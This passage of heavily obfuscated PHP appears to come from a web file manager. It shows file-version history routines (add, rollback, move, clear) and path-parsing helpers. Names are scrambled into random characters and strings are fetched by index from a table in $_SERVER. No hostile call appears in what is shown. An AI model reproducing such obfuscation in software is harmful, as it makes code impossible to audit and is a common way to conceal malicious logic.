Model($ÑÍùš÷ì[848])->get($ÑÍùš÷ì[1338]); $ƒãÄ•¶´ = intval($GLOBALS[$ÑÍùš÷ì[6]][$ÑÍùš÷ì[92]][$ÑÍùš÷ì[1316]]); $Œ÷œÔèà = $Ô÷ï¤‰í == $ÑÍùš÷ì[1339] ? min(5, $ƒãÄ•¶´) : $ƒãÄ•¶´; if ($ƒãÄ•¶´ <= 0) { return; } $ÍæÍ˜¥ = IO::info($¤ìÖÇé¡); $ÜŠäØûò = $­½“•Ôı[$ÑÍùš÷ì[447]]; if ($ÍæÍ˜¥[$ÑÍùš÷ì[79]] == 0) { return; } if ($ÍæÍ˜¥[$ÑÍùš÷ì[79]] >= 1024 * 1024 * 500) { return !1; } $÷êæ±ç­ = IO::hashSimple($¤ìÖÇé¡); if ($ÜŠäØûò && $ÜŠäØûò[0][$ÑÍùš÷ì[679]] == $÷êæ±ç­) { return !0; } if (array_key_exists($ÑÍùš÷ì[236], $ÍæÍ˜¥) && !$ÍæÍ˜¥[$ÑÍùš÷ì[236]]) { return !1; } $¯Ô–ïüë = short_id(time()); $•¤¶®€¿ = array($ÑÍùš÷ì[477] => $¯Ô–ïüë, $ÑÍùš÷ì[679] => $÷êæ±ç­, $ÑÍùš÷ì[32] => $ÍæÍ˜¥[$ÑÍùš÷ì[32]] . $ÑÍùš÷ì[10] . date($ÑÍùš÷ì[1340]) . rand_string(1), $ÑÍùš÷ì[79] => $ÍæÍ˜¥[$ÑÍùš÷ì[79]], $ÑÍùš÷ì[529] => USER_ID, $ÑÍùš÷ì[234] => time(), $ÑÍùš÷ì[1341] => $ÑÍùš÷ì[12]); IO::mkdir($­½“•Ôı[$ÑÍùš÷ì[1342]]); $£íÃÑĞ = IO::copy($¤ìÖÇé¡, $­½“•Ôı[$ÑÍùš÷ì[1342]], !1, $•¤¶®€¿[$ÑÍùš÷ì[32]]); if (!$£íÃÑĞ) { self::clearEmptyFolder($­½“•Ôı[$ÑÍùš÷ì[1342]]); return !1; } array_unshift($ÜŠäØûò, $•¤¶®€¿); if (count($ÜŠäØûò) > $Œ÷œÔèà) { $Áª¨ ¤É = array_slice($ÜŠäØûò, $Œ÷œÔèà); foreach ($Áª¨ ¤É as $Ö ÃÕ) { IO::remove($­½“•Ôı[$ÑÍùš÷ì[1342]] . $Ö ÃÕ[$ÑÍùš÷ì[32]]); } $ÜŠäØûò = array_slice($ÜŠäØûò, 0, $Œ÷œÔèà); } return self::saveData($­½“•Ôı[$ÑÍùš÷ì[1343]], $ÜŠäØûò); } public static function remove($šÂù ß©, $äğˆ’Â) { $­±ï·ë =& $_SERVER[ùèÅ´Ãš]; $ä©êÛ¼î = self::listData($šÂù ß©); $³¡™¨ÎÍ = array(); if (!$ä©êÛ¼î) { return !1; } foreach ($ä©êÛ¼î[$­±ï·ë[447]] as $·»¿€ö³) { if ($·»¿€ö³[$­±ï·ë[477]] == $äğˆ’Â) { IO::remove($ä©êÛ¼î[$­±ï·ë[1342]] . $·»¿€ö³[$­±ï·ë[32]]); continue; } $³¡™¨ÎÍ[] = $·»¿€ö³; } return self::saveData($ä©êÛ¼î[$­±ï·ë[1343]], $³¡™¨ÎÍ); } public static function clear($êúÆƒğî, $˜ëªƒ®ô = true) { $¢‘ÄÓ§Ô =& $_SERVER[ùèÅ´Ãš]; $Ï•íï¥Š = self::listData($êúÆƒğî, $˜ëªƒ®ô); if (!$Ï•íï¥Š) { return !1; } foreach ($Ï•íï¥Š[$¢‘ÄÓ§Ô[447]] as $«÷Îº´·) { IO::remove($Ï•íï¥Š[$¢‘ÄÓ§Ô[1342]] . $«÷Îº´·[$¢‘ÄÓ§Ô[32]]); } return self::saveData($Ï•íï¥Š[$¢‘ÄÓ§Ô[1343]], array()); } public static function moveHistory($–•æäµµ, $îÓ¿–çš = '', $ğ„•‰›Ô = '') { $¢‚Î¸†Ã =& $_SERVER[ùèÅ´Ãš]; $ÏÃ‰öüã = self::listData($–•æäµµ, !1); if (!$ÏÃ‰öüã || !$ÏÃ‰öüã[$¢‚Î¸†Ã[447]]) { return !1; } $å«õ¸ÚÅ = $¢‚Î¸†Ã[1330]; $îÓ¿–çš = $îÓ¿–çš ? $îÓ¿–çš : get_path_this($–•æäµµ); $ğ„•‰›Ô = $ğ„•‰›Ô ? $ğ„•‰›Ô : $ÏÃ‰öüã[$¢‚Î¸†Ã[1342]]; $´„ò°ñÆ = substr(get_path_this($ÏÃ‰öüã[$¢‚Î¸†Ã[1343]]), 0, -strlen($å«õ¸ÚÅ)); foreach ($ÏÃ‰öüã[$¢‚Î¸†Ã[447]] as $ƒõñ‚Ô¦ => $©ÍÎĞú›) { $Ìñ´±£² = $îÓ¿–çš . substr($©ÍÎĞú›[$¢‚Î¸†Ã[32]], strlen($´„ò°ñÆ)); $ˆšé³ş = IO::move($ÏÃ‰öüã[$¢‚Î¸†Ã[1342]] . $©ÍÎĞú›[$¢‚Î¸†Ã[32]], $ğ„•‰›Ô, !1, $Ìñ´±£²); if ($ˆšé³ş) { $ÏÃ‰öüã[$¢‚Î¸†Ã[447]][$ƒõñ‚Ô¦][$¢‚Î¸†Ã[32]] = $Ìñ´±£²; } } $ÏÃ‰öüã[$¢‚Î¸†Ã[1343]] = IO::move($ÏÃ‰öüã[$¢‚Î¸†Ã[1343]], $ğ„•‰›Ô, !1, $îÓ¿–çš . $å«õ¸ÚÅ); self::saveData($ÏÃ‰öüã[$¢‚Î¸†Ã[1343]], $ÏÃ‰öüã[$¢‚Î¸†Ã[447]]); self::clearEmptyFolder($ÏÃ‰öüã[$¢‚Î¸†Ã[1342]]); } public static function rollback($êõÍåÕ, $Û¡èçœ) { $…ÃñÀÌ =& $_SERVER[ùèÅ´Ãš]; $€ØÏÍàë = self::listData($êõÍåÕ); if (!$€ØÏÍàë) { return; } $ºŒ‰ğï = IO::info($êõÍåÕ); foreach ($€ØÏÍàë[$…ÃñÀÌ[447]] as $Å±ç• => $Ëõ•äŞí) { if ($Ëõ•äŞí[$…ÃñÀÌ[477]] == $Û¡èçœ) { self::add($êõÍåÕ); $‹÷¨ˆ«ú = $€ØÏÍàë[$…ÃñÀÌ[1342]] . $Ëõ•äŞí[$…ÃñÀÌ[32]]; $¹§Æ©ºø = IO::copy($‹÷¨ˆ«ú, IO::pathFather($êõÍåÕ), REPEAT_REPLACE, $ºŒ‰ğï[$…ÃñÀÌ[32]]); if ($¹§Æ©ºø) { self::remove($êõÍåÕ, $Û¡èçœ); } return $¹§Æ©ºø; } } return !1; } public static function setDetail($¢³¡ÁÄ´, $¦Ø†÷şƒ, $Ó¾¶«ê) { $šÜ‹„—Í =& $_SERVER[ùèÅ´Ãš]; $€´ßÒ¬Ã = self::listData($¢³¡ÁÄ´); if (!$€´ßÒ¬Ã) { return; } foreach ($€´ßÒ¬Ã[$šÜ‹„—Í[447]] as $¢¹¬¼Û => $‰›®´˜) { if ($‰›®´˜[$šÜ‹„—Í[477]] == $¦Ø†÷şƒ) { $€´ßÒ¬Ã[$šÜ‹„—Í[447]][$¢¹¬¼Û][$šÜ‹„—Í[1341]] = $Ó¾¶«ê; self::saveData($€´ßÒ¬Ã[$šÜ‹„—Í[1343]], $€´ßÒ¬Ã[$šÜ‹„—Í[447]]); return !0; } } return !1; } public static function fileInfo($ååÜıŞ, $î®†§©) { $´Œˆœ“ =& $_SERVER[ùèÅ´Ãš]; $ªºûŒ›£ = self::listData($ååÜıŞ); if (!$ªºûŒ›£) { show_json(LNG($´Œˆœ“[108]), !1); } $âè¦²²Ç = $´Œˆœ“[12]; foreach ($ªºûŒ›£[$´Œˆœ“[447]] as $“ãúšÌ => $àÖíÌÏí) { if ($àÖíÌÏí[$´Œˆœ“[477]] != $î®†§©) { continue; } $âè¦²²Ç = $ªºûŒ›£[$´Œˆœ“[1342]] . $àÖíÌÏí[$´Œˆœ“[32]]; break; } if (!$âè¦²²Ç) { show_json(LNG($´Œˆœ“[108]), !1); } return IO::info($âè¦²²Ç); } public static function fileOut($•ŠÃöÙô, $ø‰ ¢âÖ, $»î¹¹íß = false) { $‘œ°î×¡ =& $_SERVER[ùèÅ´Ãš]; $’Ÿù¸…¸ = self::fileInfo($•ŠÃöÙô, $ø‰ ¢âÖ); $ÉÅŸ³É =& $GLOBALS[$‘œ°î×¡[7]]; $»î¹¹íß = isset($ÉÅŸ³É[$‘œ°î×¡[1293]]) && $ÉÅŸ³É[$‘œ°î×¡[1293]] == 1; if (isset($ÉÅŸ³É[$‘œ°î×¡[33]]) && $ÉÅŸ³É[$‘œ°î×¡[33]] == $‘œ°î×¡[1344]) { return IO::fileOutImage($’Ÿù¸…¸[$‘œ°î×¡[87]], $ÉÅŸ³É[$‘œ°î×¡[1345]]); } IO::fileOut($’Ÿù¸…¸[$‘œ°î×¡[87]], $»î¹¹íß, get_path_this($•ŠÃöÙô)); } public static function listData($µŞ—œ¶¦, $œÖâùû„ = true) { $¹ëä¬ïÂ =& $_SERVER[ùèÅ´Ãš]; if ($œÖâùû„ && !IO::exist($µŞ—œ¶¦)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($µŞ—œ¶¦, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ãà™ƒ”­ = self::pathHistory($µŞ—œ¶¦); $¢”ú¿Ì® = array($¹ëä¬ïÂ[1343] => $ãà™ƒ”­ . $¹ëä¬ïÂ[1330], $¹ëä¬ïÂ[1342] => rtrim(get_path_father($ãà™ƒ”­), $¹ëä¬ïÂ[8]) . $¹ëä¬ïÂ[8], $¹ëä¬ïÂ[447] => array()); $Ÿ¬Ö©œä = IO::getContent($¢”ú¿Ì®[$¹ëä¬ïÂ[1343]]); if ($Ÿ¬Ö©œä) { $å§ÒâÏ— = json_decode($Ÿ¬Ö©œä, !0); if (is_array($å§ÒâÏ—)) { $¢”ú¿Ì®[$¹ëä¬ïÂ[447]] = $å§ÒâÏ—; } } return $¢”ú¿Ì®; } private static function saveData($É¥òü½, $£ÃÇ«¾¢) { $Ğ¾¿Å‡Ë =& $_SERVER[ùèÅ´Ãš]; self::log($Ğ¾¿Å‡Ë[1346] . $É¥òü½ . $Ğ¾¿Å‡Ë[74] . count($£ÃÇ«¾¢), $Ğ¾¿Å‡Ë[829]); if ($£ÃÇ«¾¢) { return IO::setContent($É¥òü½, json_encode($£ÃÇ«¾¢)); } $ú¶…¸¿ã = IO::pathFather($É¥òü½); IO::remove($É¥òü½); self::clearEmptyFolder($ú¶…¸¿ã); return !0; } public static function clearEmptyFolder($ŞÆ½îÆê) { $’Ÿ¦Šô =& $_SERVER[ùèÅ´Ãš]; if (trim($ŞÆ½îÆê, $’Ÿ¦Šô[8]) == trim(self::$_historyBase, $’Ÿ¦Šô[8])) { return; } $ÑÖÏÀ‘› = IO::pathFather($ŞÆ½îÆê); $¦éÄ”µ· = IO::has($ŞÆ½îÆê, !0); if ($¦éÄ”µ·[$’Ÿ¦Šô[242]] > 0 || $¦éÄ”µ·[$’Ÿ¦Šô[243]] > 0) { return; } IO::remove($ŞÆ½îÆê); self::clearEmptyFolder($ÑÖÏÀ‘›); } private static function getBasePath() { $ËáêÓÌê =& $_SERVER[ùèÅ´Ãš]; $¶¼ÏÃ = Model($ËáêÓÌê[1347])->get($ËáêÓÌê[1348]); if ($¶¼ÏÃ) { if (!IO::exist($¶¼ÏÃ)) { IO::mkdir($¶¼ÏÃ); } if (get_path_this($¶¼ÏÃ) == $ËáêÓÌê[1333]) { $­ıüÛ£Š = $ËáêÓÌê[1349] . rand_string(8); @rename($¶¼ÏÃ, get_path_father($¶¼ÏÃ) . $ËáêÓÌê[8] . $­ıüÛ£Š); $¶¼ÏÃ = DATA_PATH . $­ıüÛ£Š . $ËáêÓÌê[8]; file_put_contents(DATA_PATH . $ËáêÓÌê[1280], $ËáêÓÌê[12]); Model($ËáêÓÌê[1347])->set($ËáêÓÌê[1348], $¶¼ÏÃ); } return $¶¼ÏÃ; } $¶¼ÏÃ = DATA_PATH . $ËáêÓÌê[1349] . rand_string(8) . $ËáêÓÌê[8]; $¶¼ÏÃ = IO::mkdir($¶¼ÏÃ); $¶¼ÏÃ = rtrim($¶¼ÏÃ, $ËáêÓÌê[8]) . $ËáêÓÌê[8]; file_put_contents($¶¼ÏÃ . $ËáêÓÌê[1280], $ËáêÓÌê[12]); file_put_contents(DATA_PATH . $ËáêÓÌê[1280], $ËáêÓÌê[12]); Model($ËáêÓÌê[1347])->set($ËáêÓÌê[1348], $¶¼ÏÃ); return $¶¼ÏÃ; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\122\145\x63\x79\143\154\145\175"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\106\151\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\151\x6c\x65\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\165\160\122\x6f\157\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\162\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\123\150\x61\x72\x65\114\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\x65\124\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\145\111\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\111\x74\145\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\162\175"; public static function typeList() { $ğ¢§‘Š« =& $_SERVER[ùèÅ´Ãš]; return array($ğ¢§‘Š«[1350] => self::KOD_SOURCE, $ğ¢§‘Š«[1351] => self::KOD_USER_RECYCLE, $ğ¢§‘Š«[1352] => self::KOD_USER_FAV, $ğ¢§‘Š«[1353] => self::KOD_USER_FILE_TAG, $ğ¢§‘Š«[1354] => self::KOD_USER_FILE_TYPE, $ğ¢§‘Š«[1355] => self::KOD_GROUP_ROOT_SELF, $ğ¢§‘Š«[1356] => self::KOD_USER_SHARE, $ğ¢§‘Š«[1357] => self::KOD_USER_SHARE_LINK, $ğ¢§‘Š«[1358] => self::KOD_USER_SHARE_TO_ME, $ğ¢§‘Š«[1359] => self::KOD_SHARE_ITEM, $ğ¢§‘Š«[1360] => self::KOD_SHARE_LINK, $ğ¢§‘Š«[1361] => self::KOD_SEARCH, $ğ¢§‘Š«[1362] => self::KOD_BLOCK, $ğ¢§‘Š«[1363] => self::KOD_IO, $ğ¢§‘Š«[1364] => self::KOD_USER_RECENT, $ğ¢§‘Š«[1365] => self::KOD_USER_DRIVER); } public static function parse($¦†úğùŞ) { $³â™ÖÆë =& $_SERVER[ùèÅ´Ãš]; $¦†úğùŞ = self::clear($¦†úğùŞ); $«¦ŸçÅÀ = array_values(self::typeList()); preg_match($³â™ÖÆë[1366], $¦†úğùŞ, $œŠç»Î); $„üÇÁÁ” = array($³â™ÖÆë[498] => !1, $³â™ÖÆë[1367] => !1, $³â™ÖÆë[495] => !1, $³â™ÖÆë[87] => $¦†úğùŞ, $³â™ÖÆë[1264] => !1, $³â™ÖÆë[1263] => $³â™ÖÆë[12]); if (is_array($œŠç»Î) && count($œŠç»Î) == 5) { $‡´Ê²Ã = $³â™ÖÆë[1368] . $œŠç»Î[2] . $³â™ÖÆë[404]; if (in_array($‡´Ê²Ã, $«¦ŸçÅÀ)) { $„üÇÁÁ”[$³â™ÖÆë[1264]] = $œŠç»Î[1]; $„üÇÁÁ”[$³â™ÖÆë[33]] = $‡´Ê²Ã; $„üÇÁÁ”[$³â™ÖÆë[1369]] = substr($‡´Ê²Ã, 1, -1); $„üÇÁÁ”[$³â™ÖÆë[477]] = $œŠç»Î[3]; } $„üÇÁÁ”[$³â™ÖÆë[1263]] = $œŠç»Î[4]; } if ($„üÇÁÁ”[$³â™ÖÆë[498]] == self::KOD_SOURCE) { $„üÇÁÁ”[$³â™ÖÆë[477]] = intval($„üÇÁÁ”[$³â™ÖÆë[477]]); $„üÇÁÁ”[$³â™ÖÆë[1267]] = $„üÇÁÁ”[$³â™ÖÆë[477]]; } $ğ©ãìı¬ = array($³â™ÖÆë[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $„üÇÁÁ”[$³â™ÖÆë[1332]] = in_array($„üÇÁÁ”[$³â™ÖÆë[33]], $ğ©ãìı¬); return $„üÇÁÁ”; } public static function isTruePath($¥ô·¹ÒÉ) { $Ñè·ã‡¥ =& $_SERVER[ùèÅ´Ãš]; if (substr($¥ô·¹ÒÉ, 0, 1) != $Ñè·ã‡¥[1368]) { return !0; } if (strpos($¥ô·¹ÒÉ, $Ñè·ã‡¥[485]) === 0) { return !0; } if (strpos($¥ô·¹ÒÉ, $Ñè·ã‡¥[1336]) === 0) { return !0; } if (strpos($¥ô·¹ÒÉ, $Ñè·ã‡¥[1370]) === 0) { return !0; } if (strpos($¥ô·¹ÒÉ, $Ñè·ã‡¥[1371]) === 0) { return !0; } if (strpos($¥ô·¹ÒÉ, $Ñè·ã‡¥[1372]) === 0) { return !0; } return !1; } public static function clear($™‘éªÄ§) { $¤€õãË =& $_SERVER[ùèÅ´Ãš]; $™‘éªÄ§ = str_replace(array($¤€õãË[1167], $¤€õãË[288]), $¤€õãË[53], $™‘éªÄ§); $™‘éªÄ§ = str_replace($¤€õãË[100], $¤€õãË[8], $™‘éªÄ§); $‰À‹ğè‹ = $¤€õãË[1373]; if (substr($™‘éªÄ§, 0, 3) == $¤€õãË[1374]) { $™‘éªÄ§ = substr($™‘éªÄ§, 3); } while (strstr($™‘éªÄ§, $‰À‹ğè‹)) { $™‘éªÄ§ = str_replace($‰À‹ğè‹, $¤€õãË[8], $™‘éªÄ§); } $™‘éªÄ§ = preg_replace($¤€õãË[1375], $¤€õãË[8], $™‘éªÄ§); if ($™‘éªÄ§ == $¤€õãË[8]) { return $¤€õãË[8]; } $™‘éªÄ§ = rtrim($™‘éªÄ§, $¤€õãË[8]); return $™‘éªÄ§; } public static function pathTrue($Æ¦¥¿¶ö) { $¼ïÖ§’Ù =& $_SERVER[ùèÅ´Ãš]; if (!$Æ¦¥¿¶ö) { return $¼ïÖ§’Ù[12]; } $Æ¦¥¿¶ö = str_replace($¼ïÖ§’Ù[257], $¼ïÖ§’Ù[8], str_replace($¼ïÖ§’Ù[1376], $¼ïÖ§’Ù[8], $Æ¦¥¿¶ö)); $Æ¦¥¿¶ö = str_replace($¼ïÖ§’Ù[257], $¼ïÖ§’Ù[8], str_replace($¼ïÖ§’Ù[1376], $¼ïÖ§’Ù[8], $Æ¦¥¿¶ö)); if (!strstr($Æ¦¥¿¶ö, $¼ïÖ§’Ù[1374])) { return $Æ¦¥¿¶ö; } $“ŞÃÔŸô = explode($¼ïÖ§’Ù[8], $Æ¦¥¿¶ö); foreach ($“ŞÃÔŸô as $µçß™ => $£Êœ°äÚ) { if ($£Êœ°äÚ !== $¼ïÖ§’Ù[1377]) { continue; } for ($úØÈ¾ÄÅ = $µçß™; $úØÈ¾ÄÅ >= 0; $úØÈ¾ÄÅ--) { if ($“ŞÃÔŸô[$úØÈ¾ÄÅ] === $¼ïÖ§’Ù[10] || $“ŞÃÔŸô[$úØÈ¾ÄÅ] === $¼ïÖ§’Ù[1377] || $“ŞÃÔŸô[$úØÈ¾ÄÅ] === -1) { continue; } if ($“ŞÃÔŸô[$úØÈ¾ÄÅ] === $¼ïÖ§’Ù[12]) { $“ŞÃÔŸô[$µçß™] = -1; break; } $“ŞÃÔŸô[$µçß™] = -1; $“ŞÃÔŸô[$úØÈ¾ÄÅ] = -1; break; } } $ğŠ¹ŸÔì = array(); foreach ($“ŞÃÔŸô as $£Êœ°äÚ) { if ($£Êœ°äÚ !== -1) { $ğŠ¹ŸÔì[] = $£Êœ°äÚ; } } $—ÔòˆÖÙ = implode($¼ïÖ§’Ù[8], $ğŠ¹ŸÔì); if (strpos($—ÔòˆÖÙ, $¼ïÖ§’Ù[1378]) === 0) { $—ÔòˆÖÙ = $¼ïÖ§’Ù[1374] . substr($—ÔòˆÖÙ, strlen($¼ïÖ§’Ù[1378])); } return $—ÔòˆÖÙ; } public static function pathUrlClear($‘®•¯’) { $¼æÁ•Ò¡ =& $_SERVER[ùèÅ´Ãš]; if (!$‘®•¯’) { return $‘®•¯’; } $‘®•¯’ = rawurldecode($‘®•¯’); $‘®•¯’ = str_replace($¼æÁ•Ò¡[1376], $¼æÁ•Ò¡[8], $‘®•¯’); if (strpos($‘®•¯’, $¼æÁ•Ò¡[76]) > 0) { $‘®•¯’ = substr($‘®•¯’, 0, strpos($‘®•¯’, $¼æÁ•Ò¡[76])); } if (strpos($‘®•¯’, $¼æÁ•Ò¡[1379]) > 0) { $‘®•¯’ = substr($‘®•¯’, 0, strpos($‘®•¯’, $¼æÁ•Ò¡[1379])); } return $‘®•¯’; } public static function sourceID($ÃÀşõ‹Æ) { $ ®öòÑ =& $_SERVER[ùèÅ´Ãš]; $‰Ä›Åì« = self::parse($ÃÀşõ‹Æ); if ($‰Ä›Åì«[$ ®öòÑ[33]] !== self::KOD_SOURCE) { show_json(LNG($ ®öòÑ[1380]), !1); } return $‰Ä›Åì«[$ ®öòÑ[477]]; } public static function make($¦šÄ¤ìº) { if (!$¦šÄ¤ìº) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¦šÄ¤ìº)); } public static function makeShare($®Š­äŸ², $é²ñü“) { return self::makePath(self::KOD_SHARE_ITEM, $®Š­äŸ², $é²ñü“); } public static function makeFileTypePath($‡»†½®†) { return self::makePath(self::KOD_USER_FILE_TYPE, $‡»†½®†); } public static function makeFileTagPath($é‘—ÏÖá) { return self::makePath(self::KOD_USER_FILE_TAG, $é‘—ÏÖá); } public static function makePath($Ñ¾§îı—, $Ô ÒÙ§‘ = '', $œ‹ÇõŒ¦ = '') { $Ò•òÔé =& $_SERVER[ùèÅ´Ãš]; $Í÷ÇÂà = substr($Ñ¾§îı—, 1, -1); $Şòª‘‚ = $Ò•òÔé[1381] . $Í÷ÇÂà . $Ò•òÔé[1382] . $Ô ÒÙ§‘ . $Ò•òÔé[1383]; $Şòª‘‚ = $œ‹ÇõŒ¦ ? $Şòª‘‚ . $œ‹ÇõŒ¦ . $Ò•òÔé[8] : $Şòª‘‚; return $Şòª‘‚; } public static function hashPath($’•ËÙ¶”, $×ó£¤ÈÁ = false) { $©ÈóÑ =& $_SERVER[ùèÅ´Ãš]; if (!$’•ËÙ¶”) { return $©ÈóÑ[12]; } $Å‡š¬ı· = is_array($’•ËÙ¶”) ? $’•ËÙ¶” : IO::info($’•ËÙ¶”); $³›Œ¼æ¨ = _get($Å‡š¬ı·, $©ÈóÑ[1384], $©ÈóÑ[12]); if (!$³›Œ¼æ¨ && isset($Å‡š¬ı·[$©ÈóÑ[545]])) { $³›Œ¼æ¨ = $Å‡š¬ı·[$©ÈóÑ[545]]; } if (!$³›Œ¼æ¨ && isset($Å‡š¬ı·[$©ÈóÑ[238]])) { $³›Œ¼æ¨ = trim($Å‡š¬ı·[$©ÈóÑ[238]], $©ÈóÑ[121]); } if ($³›Œ¼æ¨) { return $³›Œ¼æ¨; } if (!$³›Œ¼æ¨ && isset($Å‡š¬ı·[$©ÈóÑ[194]]) && $Å‡š¬ı·[$©ÈóÑ[194]]) { $Å‡š¬ı· = IO::info(KodIO::make($Å‡š¬ı·[$©ÈóÑ[194]])); $³›Œ¼æ¨ = _get($Å‡š¬ı·, $©ÈóÑ[1384], $©ÈóÑ[12]); if (!$³›Œ¼æ¨ && isset($Å‡š¬ı·[$©ÈóÑ[545]])) { $³›Œ¼æ¨ = $Å‡š¬ı·[$©ÈóÑ[545]]; } } $¦å©à£Û = md5($Å‡š¬ı·[$©ÈóÑ[87]] . $Å‡š¬ı·[$©ÈóÑ[79]] . $Å‡š¬ı·[$©ÈóÑ[88]]); $âŒ¦Ù§ï = $¦å©à£Û . $©ÈóÑ[1385]; $³›Œ¼æ¨ = $³›Œ¼æ¨ ? $³›Œ¼æ¨ : Cache::get($âŒ¦Ù§ï); if (!$³›Œ¼æ¨ && $×ó£¤ÈÁ) { $³›Œ¼æ¨ = IO::hashSimple($Å‡š¬ı·[$©ÈóÑ[87]]); Cache::set($âŒ¦Ù§ï, $³›Œ¼æ¨ ? $³›Œ¼æ¨ : $¦å©à£Û, 3600 * 24 * 30); } return $³›Œ¼æ¨ ? $³›Œ¼æ¨ : $¦å©à£Û; } public static function hashPathSafe($ˆËòã¡¼, $™§Ú¿ê• = false) { $ªÄËØ©â =& $_SERVER[ùèÅ´Ãš]; $Ç³—ÆéŒ = self::hashPath($ˆËòã¡¼, $™§Ú¿ê•); return md5($Ç³—ÆéŒ . $ªÄËØ©â[1386] . Model($ªÄËØ©â[848])->get($ªÄËØ©â[849])); } public static function initSystemPath() { $ÄË÷òğ =& $_SERVER[ùèÅ´Ãš]; if (defined($ÄË÷òğ[1387])) { return; } define($ÄË÷òğ[1387], self::systemPath($ÄË÷òğ[192])); define($ÄË÷òğ[1388], self::systemPath($ÄË÷òğ[1389])); define($ÄË÷òğ[1390], self::systemPath($ÄË÷òğ[1391])); define($ÄË÷òğ[1392], self::systemPath($ÄË÷òğ[1393])); IOHistory::bindEvent(); } public static function systemPath($¬ìÒ³¤) { $ø°ìÒßî =& $_SERVER[ùèÅ´Ãš]; $ Ë„‘Æ¬ = $ø°ìÒßî[1394] . ucfirst($¬ìÒ³¤); $Òê©ïôÜ = Model($ø°ìÒßî[848])->get($ Ë„‘Æ¬); if ($Òê©ïôÜ) { return $Òê©ïôÜ; } if ($¬ìÒ³¤ == $ø°ìÒßî[192]) { $Òê©ïôÜ = self::make(Model($ø°ìÒßî[908])->systemRootPathAdd($ø°ìÒßî[612])); } else { $Òê©ïôÜ = self::systemPath($ø°ìÒßî[192]); $£Ô¨¿¤Ù = self::sourceID($Òê©ïôÜ); $Òê©ïôÜ = self::make(Model($ø°ìÒßî[908])->mkdir($£Ô¨¿¤Ù, $¬ìÒ³¤)); } Model($ø°ìÒßî[848])->set($ Ë„‘Æ¬, $Òê©ïôÜ); return $Òê©ïôÜ; } public static function systemFolder($İ»¤—€Ö) { $şúõºô = IO_PATH_SYSTEM_SOURCE . $İ»¤—€Ö; $éî©…şƒ = Cache::get($şúõºô); if (!$éî©…şƒ) { $ÖêõÏÈœ = IO::infoFullSimple($şúõºô); if (!$ÖêõÏÈœ) { $éî©…şƒ = IO::mkdir($şúõºô, REPEAT_SKIP); } else { $éî©…şƒ = $ÖêõÏÈœ[$_SERVER[ùèÅ´Ãš][87]]; } Cache::set($şúõºô, $éî©…şƒ, 3600 * 10); } return $éî©…şƒ; } public static function defaultDriver() { return Model($_SERVER[ùèÅ´Ãš][845])->defaultDriver(); } public static function defaultDriverInit() { $Ÿ©Øíœê =& $_SERVER[ùèÅ´Ãš]; static $Ë”Û±°± = false; if ($Ë”Û±°±) { return $Ë”Û±°±; } $åÌ—ÛÔÕ = self::defaultDriver(); $Ë”Û±°± = IO::init($Ÿ©Øíœê[1395] . $åÌ—ÛÔÕ[$Ÿ©Øíœê[477]] . $Ÿ©Øíœê[1383]); return $Ë”Û±°±; } public static function fileTypeList() { $úå¸ˆì† =& $_SERVER[ùèÅ´Ãš]; $âö—Ãäš = $GLOBALS[$úå¸ˆì†[6]][$úå¸ˆì†[1396]]; foreach ($âö—Ãäš as $¤Ñ¼ñ„ => $ÌÃ´—‹) { $·Ë×ƒúÌ = $úå¸ˆì†[1397] . $¤Ñ¼ñ„; $„¤§“Š› = LNG($·Ë×ƒúÌ); if ($·Ë×ƒúÌ != $„¤§“Š›) { $âö—Ãäš[$¤Ñ¼ñ„][$úå¸ˆì†[32]] = $„¤§“Š›; } } return $âö—Ãäš; } public static function ioFileDriverGet($§ß¶ñ¥ô = '') { $¥æ¢«¶Ñ =& $_SERVER[ùèÅ´Ãš]; static $«®Ë…¾ü = array(); static $ÉÎÖ·³ğ = array(); static $Óİ÷±’¥ = array(); static $œˆ·Ûİû = false; if ($œˆ·Ûİû === !1) { $œˆ·Ûİû = array($¥æ¢«¶Ñ[582] => array(), $¥æ¢«¶Ñ[669] => array()); $¤¡àÉñÒ = Model($¥æ¢«¶Ñ[1398])->get(!1, $¥æ¢«¶Ñ[1399]); foreach ($¤¡àÉñÒ as $Û å€»ç => $¤ç¬ê•ê) { if (!$¤ç¬ê•ê || $¤ç¬ê•ê == $¥æ¢«¶Ñ[12]) { continue; } if (strstr($Û å€»ç, $¥æ¢«¶Ñ[1400])) { $ÙÖ±æÈ† = str_replace($¥æ¢«¶Ñ[1400], $¥æ¢«¶Ñ[12], $Û å€»ç); $œˆ·Ûİû[$¥æ¢«¶Ñ[582]][$ÙÖ±æÈ†] = $¤ç¬ê•ê; } else { if (strstr($Û å€»ç, $¥æ¢«¶Ñ[1401])) { $ÙÖ±æÈ† = str_replace($¥æ¢«¶Ñ[1401], $¥æ¢«¶Ñ[12], $Û å€»ç); $œˆ·Ûİû[$¥æ¢«¶Ñ[669]][$ÙÖ±æÈ†] = $¤ç¬ê•ê; } } } } $“«ËÚşÙ = self::defaultDriver(); if (!$§ß¶ñ¥ô || !$œˆ·Ûİû[$¥æ¢«¶Ñ[582]] && 